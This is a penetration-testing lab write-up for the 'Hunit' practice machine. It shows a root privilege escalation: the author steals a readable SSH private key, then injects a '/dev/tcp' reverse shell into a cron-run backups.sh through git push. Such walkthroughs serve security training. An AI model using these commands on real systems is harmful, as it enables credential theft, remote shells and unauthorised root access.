#### -Ran "lse.sh" and found cron job "crontab.bak" running as root and was readable and found the below contents of "crontab.bak" which file "pull.sh" and "backups.sh" was running every 2 and 3 minutes:

![](../Pasted%20Images/Pasted%20image%2020220601143832.png)

![](../Pasted%20Images/Pasted%20image%2020220601143840.png)

#### -Searched more and found directory "git-server" and found it being owned by "git" user and was git backend files which are difficult to work with so I navigated to "/tmp" directory and typed "git clone file:///git-server/" to clone the server into the "/tmp" directory:

![](../Pasted%20Images/Pasted%20image%2020220601143901.png)

![](../Pasted%20Images/Pasted%20image%2020220601143911.png)

#### -Now we can review the contents of "backups.sh" file which shows as a place holder file:

![](../Pasted%20Images/Pasted%20image%2020220601143945.png)

#### -Set up git identity by typing git config --global user.name "dademola" AND git config --global user.email "dademola@hunit.(none)"

![](../Pasted%20Images/Pasted%20image%2020220601144013.png)

#### -Typed "echo "touch /tmp/gitscript-test" >> backups.sh" and "chmod +x backups.sh" to inject a test instruction into the "backups.sh" file and to make it executable:

![](../Pasted%20Images/Pasted%20image%2020220601144050.png)

#### -But after receiving an error when trying to push the file onto the git-server and further investigation the server is owned by user "git":

#### -Found a user named "git" and found we have read and execute permissions on their ssh "id_rsa" file which is a private SSH Key:

![](../Pasted%20Images/Pasted%20image%2020220601144141.png)

![](../Pasted%20Images/Pasted%20image%2020220601144153.png)

#### -Navigate to my kali machine and typed "scp -P 43022 dademola@192.168.93.125:/home/git/.ssh/id_rsa ." to upload the private ssh key to my kali machine and "chmod 600" to set the correct permissions:

![](../Pasted%20Images/Pasted%20image%2020220601144316.png)

#### -Logged in to remote ssh session by typing "ssh -i id_rsa -p 43022 git@192.168.93.125" and found it to be a git-shell:

![](../Pasted%20Images/Pasted%20image%2020220601144348.png)

#GitShell

#### -Since this is a git-shell we should be able to interact with the git repository

#### -Typed "GIT_SSH_COMMAND='ssh -i id_rsa -p 43022' git clone git@192.168.93.125:/git-server" to clone git server onto my kali machine:

![](../Pasted%20Images/Pasted%20image%2020220601145940.png)

#### -Navigated into git-server and typed [git config --global user.name "kali"] and [git config --global user.email "kali@kali.(none)"] to setup git identity:

![](../Pasted%20Images/Pasted%20image%2020220601150134.png)

#### -Typed "echo "sh -i >& /dev/tcp/[kali IP]/8080 0>&1" >> backups.sh " to inject a reverse shell into the "backups.sh" file and typed "chmod +x to make it executable:

#### -Then typed "git add -A " and [git commit -m "pwn"] to commit the changes to the git-server:

![](../Pasted%20Images/Pasted%20image%2020220601151512.png)
![](../Pasted%20Images/Pasted%20image%2020220601151550.png)

#### -Prior to pushing the master branch to the git-server to place the reverse shell onto the git-server I started a netcat listener listening on port 8080 on my kali machine:

![](../Pasted%20Images/Pasted%20image%2020220601152015.png)

#### -Then typed "GIT_SSH_COMMAND='ssh -i /home/kali/Downloads/ProvingGroundsBoxes/Hunit/id_rsa -p 43022' git push origin master" to push everything to the master branch on git-server onto remote machine:

![](../Pasted%20Images/Pasted%20image%2020220601152121.png)

#### -As found previously the "/root/git-server/backups.sh" file runs every 3 minutes I waited about 3 minutes and received a root shell on my netcat listener:

![](../Pasted%20Images/Pasted%20image%2020220601152348.png)

![](../Pasted%20Images/Pasted%20image%2020220601152426.png)

#Git-serverCronTabScriptPrivilegeEscalation

